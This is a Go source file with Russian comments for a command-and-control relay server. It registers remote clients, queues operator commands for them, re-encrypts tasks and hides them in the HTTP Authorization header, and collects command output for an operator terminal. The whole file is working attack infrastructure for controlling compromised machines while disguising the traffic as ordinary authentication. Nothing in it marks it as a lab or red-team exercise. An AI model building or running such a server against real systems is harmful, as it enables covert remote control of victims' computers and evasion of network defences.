// Package main - C2 промежуточный сервер.
// Агрегирует задачи от терминала, отдает их клиентам,
// принимает результаты и хранит их для последующей выдачи терминалу.
package main

import (
	"c2-project/internal/models"
	"c2-project/internal/protocol"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

// Глобальные переменные для хранения состояния сервера.
var (
	// tasks - хранилище задач. Ключ - ID задачи.
	tasks = make(map[string]models.Task)
	// clients - хранилище зарегистрированных клиентов. Ключ - ID клиента.
	clients = make(map[string]models.Client)
	// mu - мьютекс для синхронизации доступа к общим данным.
	mu sync.Mutex
	// config - структура с настройками сервера.
	config ServerConfig
)

// ServerConfig - структура конфигурации сервера.
// Загружается из файла configs/server.json.
type ServerConfig struct {
	ListenAddress string `json:"listen_address"` // Адрес для прослушивания, например ":8080"
}

// main - точка входа сервера.
func main() {
	// Загружаем конфигурацию из файла.
	if err := loadConfig(); err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}

	// Регистрируем HTTP-обработчики для API эндпоинтов.
	http.HandleFunc("/api/register", registerHandler)
	http.HandleFunc("/api/tasks", tasksHandler)
	http.HandleFunc("/api/poll", pollHandler)
	http.HandleFunc("/api/results", resultsHandler)
	http.HandleFunc("/api/result", getResultHandler)

	// Запускаем HTTP-сервер.
	log.Printf("C2 Server starting on %s", config.ListenAddress)
	log.Fatal(http.ListenAndServe(config.ListenAddress, nil))
}

// loadConfig - загружает конфигурацию из JSON-файла configs/server.json.
func loadConfig() error {
	file, err := os.Open("configs/server.json")
	if err != nil {
		return err
	}
	defer file.Close()

	decoder := json.NewDecoder(file)
	return decoder.Decode(&config)
}

// getClientIDFromBearer - извлекает client_id из заголовка Authorization.
// Ожидает формат: "Bearer <client_id>".
func getClientIDFromBearer(authHeader string) string {
	parts := strings.SplitN(authHeader, " ", 2)
	if len(parts) != 2 || parts[0] != "Bearer" {
		return ""
	}
	return parts[1]
}

// getTokenFromBearer - извлекает токен из заголовка Authorization.
// Ожидает формат: "Bearer <token>".
func getTokenFromBearer(authHeader string) string {
	parts := strings.SplitN(authHeader, " ", 2)
	if len(parts) != 2 || parts[0] != "Bearer" {
		return ""
	}
	return parts[1]
}

// registerHandler - обрабатывает регистрацию клиента.
// Ожидает client_id в заголовке Authorization: Bearer <client_id>.
// Сохраняет клиента в хранилище и возвращает статус OK.
func registerHandler(w http.ResponseWriter, r *http.Request) {
	// Разрешаем только POST-запросы.
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Извлекаем client_id из заголовка Authorization.
	authHeader := r.Header.Get("Authorization")
	clientID := getClientIDFromBearer(authHeader)
	if clientID == "" {
		http.Error(w, "Missing or invalid Authorization header", http.StatusBadRequest)
		return
	}

	// Сохраняем клиента в хранилище.
	mu.Lock()
	clients[clientID] = models.Client{
		ID:        clientID,
		LastSeen:  time.Now(),
		IP:        r.RemoteAddr,
		IsActive:  true,
		CreatedAt: time.Now(),
	}
	mu.Unlock()

	log.Printf("[OK] Client registered: %s", clientID)
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// tasksHandler - принимает задачу от терминала.
// Ожидает зашифрованную задачу в заголовке Authorization: Bearer <token>.
// Расшифровывает задачу, сохраняет её в хранилище и возвращает ID задачи.
func tasksHandler(w http.ResponseWriter, r *http.Request) {
	// Разрешаем только POST-запросы.
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Извлекаем зашифрованную задачу из заголовка Authorization.
	authHeader := r.Header.Get("Authorization")
	token := getTokenFromBearer(authHeader)
	if token == "" {
		http.Error(w, "Missing or invalid Authorization header", http.StatusBadRequest)
		return
	}

	// Расшифровываем задачу.
	data, err := protocol.DecodeRequest(token)
	if err != nil {
		http.Error(w, "Invalid token", http.StatusBadRequest)
		return
	}

	// Преобразуем данные в структуру Task.
	jsonData, _ := json.Marshal(data)
	var task models.Task
	json.Unmarshal(jsonData, &task)

	// Сохраняем задачу в хранилище с уникальным ID и статусом "pending".
	mu.Lock()
	task.ID = fmt.Sprintf("%d", time.Now().UnixNano())
	task.CreatedAt = time.Now()
	task.Status = "pending"
	tasks[task.ID] = task
	mu.Unlock()

	log.Printf("[TASK] Task created: %s -> %s", task.ID, task.Command)
	json.NewEncoder(w).Encode(map[string]string{"status": "created", "task_id": task.ID})
}

// pollHandler - клиент опрашивает наличие задач.
// Ожидает client_id в заголовке Authorization: Bearer <client_id>.
// При наличии задачи - дополнительно шифрует её и отправляет клиенту в заголовке.
func pollHandler(w http.ResponseWriter, r *http.Request) {
	// Разрешаем только POST-запросы.
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Извлекаем client_id из заголовка Authorization.
	authHeader := r.Header.Get("Authorization")
	clientID := getClientIDFromBearer(authHeader)
	if clientID == "" {
		http.Error(w, "Missing or invalid Authorization header", http.StatusBadRequest)
		return
	}

	mu.Lock()
	defer mu.Unlock()

	// Обновляем время последнего визита клиента.
	if client, exists := clients[clientID]; exists {
		client.LastSeen = time.Now()
		clients[clientID] = client
	}

	// Ищем задачу для клиента со статусом "pending".
	for _, task := range tasks {
		if task.ClientID == clientID && task.Status == "pending" {
			// Меняем статус задачи на "in_progress".
			task.Status = "in_progress"
			tasks[task.ID] = task

			log.Printf("[TASK] Task %s found for client %s", task.ID, clientID)
			log.Printf("[ENCRYPT] ADDITIONAL ENCRYPTION of task %s", task.ID)

			// ДОПОЛНИТЕЛЬНО шифруем задачу перед отправкой клиенту.
			token, err := protocol.EncodeRequest(task)
			if err != nil {
				http.Error(w, "Encoding error", http.StatusInternalServerError)
				return
			}

			log.Printf("[SEND] Encrypted task sent to client %s", clientID)
			// Передаем зашифрованную задачу в заголовке Authorization.
			w.Header().Set("Authorization", "Bearer "+token)
			json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
			return
		}
	}

	// Если задач нет - возвращаем статус "no_tasks".
	json.NewEncoder(w).Encode(map[string]string{"status": "no_tasks"})
}

// resultsHandler - принимает результат от клиента.
// Ожидает зашифрованный результат в заголовке Authorization: Bearer <token>.
// Расшифровывает результат и сохраняет его в соответствующей задаче.
func resultsHandler(w http.ResponseWriter, r *http.Request) {
	// Разрешаем только POST-запросы.
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Извлекаем зашифрованный результат из заголовка Authorization.
	authHeader := r.Header.Get("Authorization")
	token := getTokenFromBearer(authHeader)
	if token == "" {
		http.Error(w, "Missing or invalid Authorization header", http.StatusBadRequest)
		return
	}

	// Расшифровываем результат.
	data, err := protocol.DecodeRequest(token)
	if err != nil {
		http.Error(w, "Invalid token", http.StatusBadRequest)
		return
	}

	// Преобразуем данные в map с результатом.
	jsonData, _ := json.Marshal(data)
	var result map[string]interface{}
	json.Unmarshal(jsonData, &result)

	taskID, _ := result["task_id"].(string)
	output, _ := result["output"].(string)
	status, _ := result["status"].(string)

	// Сохраняем результат в соответствующей задаче.
	mu.Lock()
	if task, exists := tasks[taskID]; exists {
		task.Result = output
		task.Status = status
		task.UpdatedAt = time.Now()
		tasks[taskID] = task
	}
	mu.Unlock()

	log.Printf("[RESULT] Result received: %s -> %s", taskID, status)
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// getResultHandler - отдает результат задачи по её ID.
// Используется терминалом для опроса статуса и получения результата.
// GET /api/result?task_id=<id>
func getResultHandler(w http.ResponseWriter, r *http.Request) {
	// Разрешаем только GET-запросы.
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Извлекаем task_id из параметров запроса.
	taskID := r.URL.Query().Get("task_id")
	if taskID == "" {
		http.Error(w, "Missing task_id", http.StatusBadRequest)
		return
	}

	mu.Lock()
	defer mu.Unlock()

	// Ищем задачу по ID.
	task, exists := tasks[taskID]
	if !exists {
		http.Error(w, "Task not found", http.StatusNotFound)
		return
	}

	// Возвращаем статус и результат (если есть).
	response := map[string]interface{}{
		"status": task.Status,
		"result": task.Result,
	}
	json.NewEncoder(w).Encode(response)
}
